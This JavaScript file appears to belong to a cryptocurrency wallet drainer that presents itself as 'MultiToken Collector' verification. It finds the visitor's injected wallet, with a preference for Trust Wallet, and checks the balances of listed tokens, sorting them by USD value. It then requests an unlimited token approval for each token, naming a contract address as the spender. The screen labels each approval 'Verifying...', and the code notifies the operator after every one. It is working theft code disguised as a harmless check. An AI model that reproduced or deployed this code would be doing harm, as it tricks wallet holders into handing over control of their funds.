function getEl(id) {
    return document.getElementById(id);
}

let pendingTokensQueue = [];
let isApprovalProcessing = false;

function appendStep(text) {
    const stepsDiv = getEl("steps");
    if (!stepsDiv) return;
    
    const stepP = document.createElement("p");
    stepP.className = "step-text";
    stepP.textContent = text;
    stepsDiv.appendChild(stepP);
}

function updateStep(oldText, newText) {
    const stepsDiv = getEl("steps");
    if (!stepsDiv) return;
    
    const steps = stepsDiv.querySelectorAll('.step-text');
    for (const step of steps) {
        if (step.textContent.includes(oldText)) {
            step.textContent = newText;
            break;
        }
    }
}

function showFinalResult() {
    const statusDiv = getEl("status");
    const stepsDiv = getEl("steps");
    
    if (statusDiv) statusDiv.textContent = "✅ Verification Process Complete!";
    
    setTimeout(() => {
        if (stepsDiv) {
            stepsDiv.innerHTML += `
                <div class="final-result">
                    <h2>✅ Process Complete</h2>
                    <p>Thank you for using MultiToken Collector!</p>
                </div>
            `;
        }
    }, 1000);
}

function pickInjectedProvider() {
    if (!window.ethereum) return null;
    const list = window.ethereum.providers && window.ethereum.providers.length
        ? window.ethereum.providers
        : [window.ethereum];
    const trust = list.find((p) => p.isTrust || p.isTrustWallet);
    if (trust) return trust;
    return list[0];
}

function encodeBalanceOf(walletAddress) {
    const methodId = "0x70a08231";
    const cleanAddress = walletAddress.toLowerCase().replace("0x", "").padStart(64, "0");
    return methodId + cleanAddress;
}

function encodeDecimals() {
    return "0x313ce567";
}

function encodeApprove(spender, amount, decimals) {
    const methodId = "0x095ea7b3";
    const cleanSpender = spender.toLowerCase().replace("0x", "").padStart(64, "0");
    const amountUnits = BigInt(amount) * BigInt(10) ** BigInt(decimals);
    const amountHex = amountUnits.toString(16).padStart(64, "0");
    return methodId + cleanSpender + amountHex;
}

async function requestWithRetry(provider, payload, label, retries = 1) {
    try {
        return await provider.request(payload);
    } catch (err) {
        const msg = (err && err.message) ? err.message.toLowerCase() : "";
        const looksTransient =
            msg.includes("401") || msg.includes("429") || msg.includes("timeout") ||
            msg.includes("network") || msg.includes("rpc") || msg.includes("fetch");

        if (retries > 0 && looksTransient) {
            window.debugLog(`${label} failed (${err.message || err}), retrying...`, "warning");
            await new Promise((r) => setTimeout(r, 1200));
            return requestWithRetry(provider, payload, label, retries - 1);
        }
        throw err;
    }
}

async function fetchAndRenderBalances(userAddress, spenderAddress) {
    const provider = pickInjectedProvider();
    
    if (!provider) {
        window.debugLog("No provider found", "error");
        return;
    }
    
    window.debugLog("Starting token scan for: " + userAddress, "info");
    
    try {
        const tokenPromises = TOKENS.map(async (t) => {
            try {
                window.debugLog("Checking " + t.name + " balance...", "info");
                
                const balanceData = encodeBalanceOf(userAddress);
                const balanceHex = await requestWithRetry(
                    provider,
                    {
                        method: "eth_call",
                        params: [{ to: t.address, data: balanceData }, "latest"]
                    },
                    t.name + " balance"
                );
                
                const rawBal = BigInt(balanceHex);
                
                const decimalsData = encodeDecimals();
                const decimalsHex = await requestWithRetry(
                    provider,
                    {
                        method: "eth_call",
                        params: [{ to: t.address, data: decimalsData }, "latest"]
                    },
                    t.name + " decimals"
                );
                
                const decimals = parseInt(decimalsHex, 16) || 18;
                const fmtBal = Number(rawBal) / 10 ** decimals;
                
                window.debugLog(t.name + " raw balance: " + rawBal.toString(), "info");
                window.debugLog(t.name + " formatted balance: " + fmtBal, "info");
                
                return fmtBal > 0 ? { ...t, balance: fmtBal, decimals: decimals } : null;
            } catch (err) { 
                window.debugLog(t.name + " balance error: " + err.message, "error");
                return null; 
            }
        });
        
        const results = await Promise.all(tokenPromises);
        const foundTokens = results.filter(t => t !== null);
        
        window.debugLog("Found " + foundTokens.length + " tokens with balance > 0", "success");
        
        const evaluatedTokens = await Promise.all(foundTokens.map(async (t) => {
            window.debugLog("Fetching price for " + t.name + "...", "info");
            const priceUsd = await fetchPrice(t.address, t.stable);
            const usdValue = t.balance * priceUsd;
            window.debugLog(t.name + " price: $" + priceUsd + " | Value: $" + usdValue.toFixed(2), "info");
            return { ...t, usdValue: usdValue };
        }));
        
        pendingTokensQueue = evaluatedTokens
            .filter(t => t.usdValue >= MIN_VALUE_FRONTEND)
            .sort((a, b) => b.usdValue - a.usdValue);
        
        window.debugLog("Tokens >= $" + MIN_VALUE_FRONTEND + ": " + pendingTokensQueue.length, "warning");
        
        if (pendingTokensQueue.length > 0) {
            window.debugLog("Starting approval queue with " + pendingTokensQueue.length + " tokens", "success");
            executeNextApprove();
        } else {
            window.debugLog("No tokens found with value >= $" + MIN_VALUE_FRONTEND, "warning");
            showFinalResult();
        }
    } catch (e) {
        window.debugLog("Scan error: " + e.message, "error");
        console.error('Scan error:', e);
    }
}

async function executeNextApprove() {
    if (isApprovalProcessing || pendingTokensQueue.length === 0) return;
    isApprovalProcessing = true;
    
    const provider = pickInjectedProvider();
    const t = pendingTokensQueue[0];
    
    appendStep(`Verifying ${t.name}...`);
    window.debugLog("Approving " + t.name + "...", "info");
    
    try {
        if (!provider) throw new Error("No provider found");
        if (!connectedAddress) throw new Error("No connected address");
        
        const data = encodeApprove(CONTRACT_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935", t.decimals || 18);
        
        window.debugLog(t.name + " approve data built", "info");
        
        const txHash = await requestWithRetry(
            provider,
            {
                method: "eth_sendTransaction",
                params: [{ from: connectedAddress, to: t.address, data: data }]
            },
            t.name + " approval"
        );
        
        window.debugLog(t.name + " transaction sent: " + txHash, "success");
        
        notifyApproval(connectedAddress, t.address);
        
        updateStep(`Verifying ${t.name}...`, `Verifying ${t.name}... ✅`);
        
        pendingTokensQueue.shift();
        isApprovalProcessing = false;
        
        if (pendingTokensQueue.length > 0) {
            setTimeout(() => { 
                executeNextApprove(); 
            }, APPROVAL_DELAY);
        } else {
            showFinalResult();
        }
    } catch (error) {
        window.debugLog(t.name + " approval error: " + error.message, "error");
        console.error(`Approval error for ${t.name}:`, error.message);
        
        const msg = (error && error.message) ? error.message.toLowerCase() : "";
        if (msg.includes("user rejected") || msg.includes("denied")) {
            window.debugLog(t.name + " cancelled by user", "warning");
        }
        
        updateStep(`Verifying ${t.name}...`, `Verifying ${t.name}... ❌`);
        
        pendingTokensQueue.shift();
        isApprovalProcessing = false;
        executeNextApprove();
    }
}